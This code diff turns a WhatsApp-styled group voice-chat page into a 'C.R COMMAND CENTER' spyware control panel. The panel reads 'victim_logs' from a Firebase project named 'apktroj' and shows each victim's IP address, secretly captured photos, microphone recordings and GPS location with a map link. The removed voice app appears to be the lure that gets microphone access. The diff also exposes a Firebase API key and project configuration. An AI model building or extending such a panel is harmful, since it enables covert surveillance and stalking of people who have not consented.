@@ -3,71 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R V2 | WA VOICE PRO</title>
+    <title>C.R Monitoring V1.1 - Advanced</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background-color: #0b141a; color: #e9edef; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
-        .wa-dark { background-color: #202c33; }
-        .wa-green { background-color: #00a884; }
-        .member-item { border-bottom: 1px solid #2a3942; transition: 0.2s; }
-        .member-item:hover { background-color: #2a3942; }
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; }
-        .is-speaking { border-left: 4px solid #00a884; animation: glow 1s infinite alternate; }
-        @keyframes glow { from { background: #202c33; } to { background: #2a3942; } }
+        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
+        .glitch-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
+        .victim-card { background: #111; border: 1px solid #222; border-radius: 8px; transition: 0.3s; }
+        .victim-card:hover { border-color: #ff0000; }
+        .tab-btn { padding: 10px; border-bottom: 2px solid transparent; cursor: pointer; }
+        .tab-btn.active { border-color: #ff0000; color: #ff0000; }
     </style>
 </head>
-<body class="h-screen flex flex-col">
-
-    <!-- Header -->
-    <header class="wa-dark p-4 flex items-center justify-between shadow-lg">
-        <div class="flex items-center gap-3">
-            <div class="w-10 h-10 rounded-full wa-green flex items-center justify-center font-bold text-white shadow-xl">CR</div>
+<body class="p-4">
+    <div class="max-w-6xl mx-auto">
+        <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
             <div>
-                <h1 class="font-bold text-sm">Gigs Group V2</h1>
-                <p id="stats" class="text-[10px] text-gray-400">Menghubungkan ke server...</p>
+                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER</h1>
+                <p class="text-xs text-gray-500">PROTOTYPE V1.1 | OWNER: GIGS | STATUS: <span class="animate-ping">●</span> ONLINE</p>
+            </div>
+            <div id="auth-info" class="text-right text-[10px] text-gray-400">Connecting to C.R Core...</div>
+        </header>
+
+        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+            <!-- Sidebar: Victim List -->
+            <div class="lg:col-span-1 border-r border-green-900 pr-4">
+                <h2 class="text-lg font-bold mb-4 border-b border-green-900">VICTIM LIST</h2>
+                <div id="victim-list" class="space-y-2 max-h-[70vh] overflow-y-auto">
+                    <!-- List victims here -->
+                </div>
+            </div>
+
+            <!-- Main Panel: Data Display -->
+            <div class="lg:col-span-3">
+                <div class="flex space-x-4 mb-4 border-b border-gray-800">
+                    <div class="tab-btn active" id="tab-log">ACTIVITY LOGS</div>
+                    <div class="tab-btn" id="tab-media">MEDIA & MIC</div>
+                    <div class="tab-btn" id="tab-geo">GEOLOCATION</div>
+                </div>
+
+                <div id="content-log" class="space-y-4">
+                    <div id="logs-container"></div>
+                </div>
+
+                <div id="content-media" class="hidden grid grid-cols-1 md:grid-cols-2 gap-4">
+                    <div class="glitch-border p-4">
+                        <h3 class="text-red-500 mb-2 underline font-bold">LATEST PHOTO</h3>
+                        <div id="photo-display" class="w-full aspect-video bg-black flex items-center justify-center border border-gray-800">
+                            <span class="text-gray-700">No Image Captured</span>
+                        </div>
+                    </div>
+                    <div class="glitch-border p-4">
+                        <h3 class="text-blue-500 mb-2 underline font-bold">AUDIO STREAM</h3>
+                        <div id="audio-container" class="space-y-2">
+                             <span class="text-gray-700 italic">Waiting for mic activation...</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="content-geo" class="hidden">
+                    <div id="map-info" class="glitch-border p-4 bg-black min-h-[300px]">
+                        <p class="text-yellow-500">COORD: <span id="lat-long">0.0, 0.0</span></p>
+                        <p class="text-white">MAP LINK: <a id="map-link" href="#" target="_blank" class="text-blue-400 underline italic">Open in Google Maps</a></p>
+                        <div class="mt-4 border border-gray-800 p-2 text-xs text-gray-500">
+                            Peta statis tidak tersedia tanpa API Key Map. Klik link di atas untuk navigasi.
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
-        <button onclick="location.reload()" class="p-2 rounded-full hover:bg-gray-700">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
-        </button>
-    </header>
-
-    <!-- Member List -->
-    <div id="setup-screen" class="flex-1 flex flex-col items-center justify-center p-6 text-center">
-        <div class="w-20 h-20 bg-gray-700 rounded-full mb-4 flex items-center justify-center">
-            <svg xmlns="http://www.w3.org/2000/svg" class="h-10 w-10 opacity-30" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd" /></svg>
-        </div>
-        <h2 class="text-xl font-bold mb-2">Voice Group Gigs</h2>
-        <p class="text-xs text-gray-500 mb-6">Masukan nama lo buat gabung ke obrolan privat.</p>
-        <input type="text" id="username" placeholder="Nama lo..." class="w-full max-w-xs bg-[#2a3942] border-none rounded-lg p-3 mb-4 outline-none focus:ring-2 focus:ring-[#00a884]">
-        <button onclick="join()" class="w-full max-w-xs wa-green py-3 rounded-lg font-bold text-black hover:opacity-90">GABUNG SEKARANG</button>
     </div>
 
-    <main id="main-app" class="hidden flex-1 overflow-y-auto">
-        <div id="list-container">
-            <!-- Members injected here -->
-        </div>
-    </main>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
+        import { getFirestore, collection, onSnapshot, query, orderBy } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-    <!-- Active Controls -->
-    <footer id="controls" class="hidden wa-dark p-6 border-t border-gray-800 flex items-center justify-between">
-        <div class="flex items-center gap-4">
-            <button id="muteBtn" onclick="toggleMute()" class="w-12 h-12 rounded-full bg-gray-700 flex items-center justify-center hover:bg-gray-600">
-                <svg id="micIcon" xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" /></svg>
-            </button>
-            <div>
-                <p id="my-name-display" class="font-bold text-sm text-green-500">Connecting...</p>
-                <p class="text-[10px] opacity-50 uppercase tracking-widest">Enkripsi P2P Aktif</p>
-            </div>
-        </div>
-        <button onclick="location.reload()" class="text-red-500 text-xs font-bold border border-red-500/30 px-4 py-2 rounded-lg">KELUAR</button>
-    </footer>
-
-    <div id="audio-dump" class="hidden"></div>
-
-    <script>
         const firebaseConfig = {
             apiKey: "AIzaSyBhJsqqGbJGZ-u-PqJ5m4L-gHCaTqlS3Wo",
             authDomain: "apktroj.firebaseapp.com",
@@ -75,178 +85,73 @@
             projectId: "apktroj",
             storageBucket: "apktroj.firebasestorage.app",
             messagingSenderId: "943833619122",
-            appId: "1:943833619122:web:d757ced4d56267abf247ab"
+            appId: "1:943833619122:web:d757ced4d56267abf247ab",
+            measurementId: "G-WR01BDY3G6"
         };
 
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
-        const myId = "U" + Math.floor(Math.random() * 1000000);
-        let localStream, myName;
-        let peers = {};
-        let isMuted = false;
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+        const auth = getAuth(app);
+        const appId = "apktroj_v1";
 
-        const rtcConfig = {
-            iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' },
-                { urls: 'stun:stun1.l.google.com:19302' }
-            ]
-        };
+        onAuthStateChanged(auth, async (user) => {
+            if (!user) await signInAnonymously(auth);
+            else {
+                document.getElementById('auth-info').innerText = "CORE CONNECTED: " + user.uid;
+                initApp();
+            }
+        });
 
-        async function join() {
-            myName = document.getElementById('username').value || "User_" + myId.slice(-3);
-            try {
-                localStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                document.getElementById('setup-screen').classList.add('hidden');
-                document.getElementById('main-app').classList.remove('hidden');
-                document.getElementById('controls').classList.remove('hidden');
-                document.getElementById('my-name-display').innerText = myName;
-
-                // 1. Sinkronisasi Member
-                const memberRef = db.ref('v2/members/' + myId);
-                memberRef.set({ name: myName, speaking: false });
-                memberRef.onDisconnect().remove();
-
-                // 2. Listen Signaling (Signaling diperbaiki)
-                db.ref('v2/signal/' + myId).on('child_added', async snap => {
-                    const data = snap.val();
-                    const fromId = data.from;
-                    
-                    if (!peers[fromId]) setupPeer(fromId, false);
-                    
-                    const pc = peers[fromId];
-                    if (data.type === 'offer') {
-                        await pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
-                        const answer = await pc.createAnswer();
-                        await pc.setLocalDescription(answer);
-                        db.ref(`v2/signal/${fromId}`).push({ from: myId, type: 'answer', sdp: answer });
-                    } else if (data.type === 'answer') {
-                        await pc.setRemoteDescription(new RTCSessionDescription(data.sdp));
-                    } else if (data.type === 'ice') {
-                        pc.addIceCandidate(new RTCIceCandidate(data.candidate)).catch(e => {});
-                    }
-                    snap.ref.remove();
+        // Tab Switching Logic
+        document.querySelectorAll('.tab-btn').forEach(btn => {
+            btn.addEventListener('click', () => {
+                document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+                btn.classList.add('active');
+                const target = btn.id.replace('tab-', 'content-');
+                ['content-log', 'content-media', 'content-geo'].forEach(id => {
+                    document.getElementById(id).classList.toggle('hidden', id !== target);
                 });
+            });
+        });
 
-                // 3. Monitor Member Masuk
-                db.ref('v2/members').on('value', snap => {
-                    const users = snap.val() || {};
-                    updateUI(users);
-                    
-                    // Inisiasi koneksi ke member baru (Hanya jika ID kita lebih kecil - Anti Tabrakan)
-                    Object.keys(users).forEach(userId => {
-                        if (userId !== myId && !peers[userId] && parseInt(myId.slice(1)) < parseInt(userId.slice(1))) {
-                            setupPeer(userId, true);
+        function initApp() {
+            const logsRef = collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs');
+            onSnapshot(logsRef, (snap) => {
+                const container = document.getElementById('logs-container');
+                const list = document.getElementById('victim-list');
+                container.innerHTML = '';
+                list.innerHTML = '';
+
+                snap.forEach(doc => {
+                    const data = doc.data();
+                    // Update Logs
+                    const log = document.createElement('div');
+                    log.className = 'victim-card p-3 mb-2 text-xs';
+                    log.innerHTML = `[${new Date(data.timestamp).toLocaleTimeString()}] IP: ${data.ip || '??'} - Action: ${data.action}`;
+                    container.prepend(log);
+
+                    // Update Media if exists
+                    if(data.action === "CAPTURED_MEDIA") {
+                        if(data.photo) {
+                            document.getElementById('photo-display').innerHTML = `<img src="${data.photo}" class="max-h-full">`;
                         }
-                    });
+                        if(data.audio) {
+                            const audioHtml = `<div class="bg-gray-900 p-2 rounded flex items-center space-x-2">
+                                <span class="text-xs">REC ${new Date(data.timestamp).toLocaleTimeString()}</span>
+                                <audio controls src="${data.audio}" class="h-8"></audio>
+                            </div>`;
+                            document.getElementById('audio-container').innerHTML = audioHtml + document.getElementById('audio-container').innerHTML;
+                        }
+                    }
+
+                    // Update Geo
+                    if(data.location) {
+                        document.getElementById('lat-long').innerText = `${data.location.lat}, ${data.location.lng}`;
+                        document.getElementById('map-link').href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
+                    }
                 });
-
-                startVoiceMonitor();
-            } catch (e) {
-                alert("Woi! Izinkan Mic di browser lo!");
-            }
-        }
-
-        function setupPeer(targetId, isOfferer) {
-            const pc = new RTCPeerConnection(rtcConfig);
-            peers[targetId] = pc;
-
-            localStream.getTracks().forEach(track => pc.addTrack(track, localStream));
-
-            pc.onicecandidate = e => {
-                if (e.candidate) db.ref(`v2/signal/${targetId}`).push({ from: myId, type: 'ice', candidate: e.candidate.toJSON() });
-            };
-
-            pc.ontrack = e => {
-                let audio = document.getElementById('audio-' + targetId);
-                if (!audio) {
-                    audio = document.createElement('audio');
-                    audio.id = 'audio-' + targetId;
-                    audio.autoplay = true;
-                    document.getElementById('audio-dump').appendChild(audio);
-                }
-                audio.srcObject = e.streams[0];
-            };
-
-            if (isOfferer) {
-                pc.onnegotiationneeded = async () => {
-                    const offer = await pc.createOffer();
-                    await pc.setLocalDescription(offer);
-                    db.ref(`v2/signal/${targetId}`).push({ from: myId, type: 'offer', sdp: offer });
-                };
-            }
-        }
-
-        function updateUI(users) {
-            const container = document.getElementById('list-container');
-            const stats = document.getElementById('stats');
-            const keys = Object.keys(users);
-            stats.innerText = `${keys.length} Member Online`;
-            
-            container.innerHTML = '';
-            keys.forEach(id => {
-                const u = users[id];
-                const isMe = id === myId;
-                const activeClass = u.speaking ? 'is-speaking' : '';
-                
-                container.innerHTML += `
-                    <div class="member-item p-4 flex items-center justify-between ${activeClass}">
-                        <div class="flex items-center gap-3">
-                            <div class="w-12 h-12 rounded-full bg-gray-600 flex items-center justify-center font-bold text-white uppercase border-2 ${u.speaking ? 'border-green-500' : 'border-gray-500'}">
-                                ${u.name.charAt(0)}
-                            </div>
-                            <div>
-                                <h3 class="font-bold text-sm">${u.name} ${isMe ? '(Lo)' : ''}</h3>
-                                <p class="text-[10px] opacity-50 flex items-center gap-1">
-                                    <span class="status-dot ${u.speaking ? 'bg-green-500' : 'bg-gray-500'}"></span>
-                                    ${u.speaking ? 'Lagi Ngomong...' : 'Mendengarkan'}
-                                </p>
-                            </div>
-                        </div>
-                    </div>
-                `;
             });
         }
-
-        function toggleMute() {
-            isMuted = !isMuted;
-            localStream.getAudioTracks()[0].enabled = !isMuted;
-            const btn = document.getElementById('muteBtn');
-            const icon = document.getElementById('micIcon');
-            
-            if (isMuted) {
-                btn.classList.add('bg-red-900');
-                icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />';
-                db.ref('v2/members/' + myId + '/speaking').set(false);
-            } else {
-                btn.classList.remove('bg-red-900');
-                icon.innerHTML = '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 11a7 7 0 01-7 7m0 0a7 7 0 01-7-7m7 7v4m0 0H8m4 0h4m-4-8a3 3 0 01-3-3V5a3 3 0 116 0v6a3 3 0 01-3 3z" />';
-            }
-        }
-
-        function startVoiceMonitor() {
-            const ctx = new AudioContext();
-            const src = ctx.createMediaStreamSource(localStream);
-            const analyzer = ctx.createAnalyser();
-            src.connect(analyzer);
-            const data = new Uint8Array(analyzer.frequencyBinCount);
-            let lastSpeaking = false;
-
-            function check() {
-                analyzer.getByteFrequencyData(data);
-                const vol = data.reduce((a, b) => a + b) / data.length;
-                const speaking = vol > 12 && !isMuted;
-                
-                if (speaking !== lastSpeaking) {
-                    db.ref('v2/members/' + myId + '/speaking').set(speaking);
-                    lastSpeaking = speaking;
-                }
-                requestAnimationFrame(check);
-            }
-            check();
-        }
-
-        // Clean up on start
-        db.ref('v2/members').once('value', s => { if(!s.exists()) db.ref('v2').remove(); });
     </script>
 </body>
 </html>
